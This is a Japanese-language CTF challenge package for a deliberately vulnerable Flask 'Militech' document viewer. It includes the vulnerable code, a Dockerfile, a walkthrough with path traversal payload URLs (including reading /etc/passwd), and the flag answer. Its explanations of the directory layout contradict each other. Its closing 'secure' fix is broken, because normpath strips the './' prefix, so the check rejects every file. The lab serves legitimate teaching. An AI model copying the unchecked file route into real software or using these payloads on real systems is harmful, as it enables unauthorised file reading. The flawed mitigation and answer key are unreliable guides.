# Document Viewer: Path Traversal Attack

## シナリオ

あなたは、Militech Corporation の内部監査チームの一員として、社内ドキュメント管理システムのセキュリティ評価を実施している。

**ターゲット**: 社内ドキュメントビューアシステム  
**目的**: パストラバーサル攻撃により、アクセス制限されたファイルを取得せよ  
**インテル**: このシステムは `./docs/` ディレクトリ内のファイルのみを表示する仕様だが、ファイルパスの検証が不十分である可能性がある。システム外のファイル（特に `/home/ctfuser/flag.txt`）へのアクセスが可能かどうかを検証し、機密フラグを入手せよ。

**ミッション**: ディレクトリトラバーサルを使用し、権限外のファイルにアクセスせよ。

---

## 技術的背景: Path Traversalとは

### 概要

**Path Traversal（ディレクトリトラバーサル）** は、Webアプリケーションがファイルパスを扱う際、ユーザー入力を適切に検証せずに使用することで、意図しないディレクトリやファイルにアクセスできてしまう脆弱性です。

### 仕組み

#### 1. 通常のファイル読み取り

```python
# docs/ ディレクトリ内のファイルを表示
filename = user_input  # 例: "report.txt"
filepath = f"./docs/{filename}"
# 実際のパス: ./docs/report.txt
```

#### 2. パストラバーサル攻撃

```python
# ../を使って上位ディレクトリに移動
filename = "../../../../home/ctfuser/flag.txt"
filepath = f"./docs/{filename}"
# 実際のパス: ./docs/../../../../home/ctfuser/flag.txt
# 正規化後: /home/ctfuser/flag.txt
```

### `../` の意味

- `.` : 現在のディレクトリ
- `..` : 1つ上のディレクトリ
- `../../../` : 3つ上のディレクトリ

```
/home/ctfuser/app/docs/report.txt
                    ↑ 現在位置
../                 ↑ /home/ctfuser/app/
../../              ↑ /home/ctfuser/
../../../           ↑ /home/
../../../../        ↑ /
../../../../home/ctfuser/flag.txt → /home/ctfuser/flag.txt
```

---

## 脆弱なコードの仕様

### アプリケーション構成

**技術スタック**:
- **言語**: Python 3.11
- **フレームワーク**: Flask 3.0.0
- **ポート**: 8000
- **機能**: 社内ドキュメントの閲覧

### 脆弱なコード実装

```python
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# サンプルドキュメント
DOCUMENTS = {
    "annual_report.txt": "Militech Corp - Annual Report 2024\n営業利益: 125億円",
    "policy.txt": "社内セキュリティポリシー\n1. パスワードは8文字以上...",
    "memo.txt": "重要連絡: 次回会議は12/15 10:00から"
}

def init_docs():
    """docs/ ディレクトリを初期化"""
    os.makedirs('./docs', exist_ok=True)
    for filename, content in DOCUMENTS.items():
        with open(f'./docs/{filename}', 'w') as f:
            f.write(content)

@app.route('/')
def index():
    return render_template_string('''
        <!DOCTYPE html>
        <html lang="ja">
        <head>
            <title>パストラバーサル - ファイル閲覧</title>
            <style>
                body {
                    background: #1a1a1a;
                    color: #00aaff;
                    font-family: monospace;
                    padding: 20px;
                }
                .container {
                    max-width: 800px;
                    margin: 0 auto;
                    border: 2px solid #00aaff;
                    padding: 20px;
                    border-radius: 10px;
                }
                a {
                    color: #00ff00;
                    text-decoration: none;
                    margin: 5px;
                    display: inline-block;
                }
                a:hover {
                    text-decoration: underline;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>MILITECH CORP</h1>
                <h2>Internal Document Viewer</h2>
                <h3>[AUTHORIZED PERSONNEL ONLY]</h3>
                <hr>
                <h3>Available Documents:</h3>
                <ul>
                    <li><a href="/view?file=annual_report.txt">Annual Report 2024</a></li>
                    <li><a href="/view?file=policy.txt">Security Policy</a></li>
                    <li><a href="/view?file=memo.txt">Internal Memo</a></li>
                </ul>
            </div>
        </body>
        </html>
    ''')

@app.route('/view')
def view():
    filename = request.args.get('file', '')
    
    # ❌ 脆弱性: パス検証なし
    filepath = f"./docs/{filename}"
    
    try:
        # ❌ ユーザー入力を直接ファイルパスに使用
        with open(filepath, 'r') as f:
            content = f.read()
        
        return render_template_string('''
            <h1>Document Viewer</h1>
            <h2>File: {{ filename }}</h2>
            <pre style="background: #000; color: #0f0; padding: 10px;">{{ content }}</pre>
            <a href="/">Back</a>
        ''', filename=filename, content=content)
        
    except FileNotFoundError:
        return render_template_string('''
            <h1>Error</h1>
            <p>File not found: {{ filename }}</p>
            <a href="/">Back</a>
        ''', filename=filename)
    except Exception as e:
        return f"Error: {str(e)}"

if __name__ == '__main__':
    init_docs()
    app.run(debug=False, host='0.0.0.0', port=8000)
```

### Dockerfile

```dockerfile
FROM python:3.11-slim

RUN useradd -m -u 1000 ctfuser

# フラグファイルを作成（重要！）
RUN echo "SolCTF{path_traversal_militech_docs}" > /home/ctfuser/flag.txt && \
    chmod 644 /home/ctfuser/flag.txt

WORKDIR /home/ctfuser

COPY app.py requirements.txt ./

RUN pip install --no-cache-dir -r requirements.txt

USER ctfuser

EXPOSE 8000

CMD ["python", "app.py"]
```

---

## 攻略手順

### ステップ1: 偵察

1. `http://{{CONTAINER_HOST}}/` にアクセス
2. 3つのドキュメントリンクを確認
3. いずれかをクリック（例: Annual Report）

### ステップ2: URL構造の分析

**URL例**: `http://{{CONTAINER_HOST}}/view?file=annual_report.txt`

**分析**:
- `file` パラメータでファイル名を指定
- `./docs/annual_report.txt` が開かれる

### ステップ3: パストラバーサルを試す

**テスト1: 1つ上のディレクトリ**

URL: `http://{{CONTAINER_HOST}}/view?file=../app.py`

→ エラーまたはapp.pyの内容が表示される

**テスト2: さらに上のディレクトリ**

URL: `http://{{CONTAINER_HOST}}/view?file=../../flag.txt`

→ フラグが見つかるまで `../` を増やす

### ステップ4: フラグ取得

**最終ペイロード**:

```
http://{{CONTAINER_HOST}}/view?file=../../../../home/ctfuser/flag.txt
```

または:

```
http://{{CONTAINER_HOST}}/view?file=../flag.txt
```

**結果**: `SolCTF{path_traversal_militech_docs}`

---

## 🎓 初心者向け: Path Traversalの基礎

### ディレクトリ構造の理解

```
/
├── home/
│   └── ctfuser/
│       ├── flag.txt           ← 目標
│       ├── app.py
│       └── docs/              ← 現在位置
│           ├── annual_report.txt
│           ├── policy.txt
│           └── memo.txt
```

### ../ の動作

現在位置が `/home/ctfuser/docs/` の場合:

```
./docs/report.txt          → /home/ctfuser/docs/report.txt
../app.py                  → /home/ctfuser/app.py
../../flag.txt             → /home/flag.txt (存在しない)
../flag.txt                → /home/ctfuser/flag.txt (正解！)
```

---

## 🔍 うまくいかない場合

### ケース1: 404 File not found

**原因**: `../` の数が足りない、または多すぎる

**対処**:
```
試す順番:
1. ../flag.txt
2. ../../flag.txt
3. ../../../flag.txt
4. ../../../../flag.txt
```

### ケース2: Permission denied

**原因**: ファイルの読み取り権限がない

**対処**: 別のファイルを試す
```
../app.py
../requirements.txt
../../../../etc/passwd (読み取り可能)
```

---

## 難易度

- **難易度**: 2/5
- **対象**: 初級〜中級
- **所要時間**: 20-30分

## Story Hook

```
Militech Corporationの社内ドキュメント管理システムが、セキュリティ監査の対象となった。このシステムは従業員が社内文書を閲覧するためのものだが、ファイルパスの検証が不十分であるという指摘がある。あなたの任務は、パストラバーサル攻撃により、本来アクセスできないはずのフラグファイルを取得することだ。
```

## タグ

- Web
- Path Traversal
- LFI
- Beginner
- File System

## 対策

```python
# ✅ セキュアな実装
import os

# ホワイトリスト方式
ALLOWED_FILES = ['annual_report.txt', 'policy.txt', 'memo.txt']
if filename not in ALLOWED_FILES:
    return "Error: Access denied"

# パスの正規化とチェック
filepath = os.path.normpath(f"./docs/{filename}")
if not filepath.startswith('./docs/'):
    return "Error: Access denied"
```

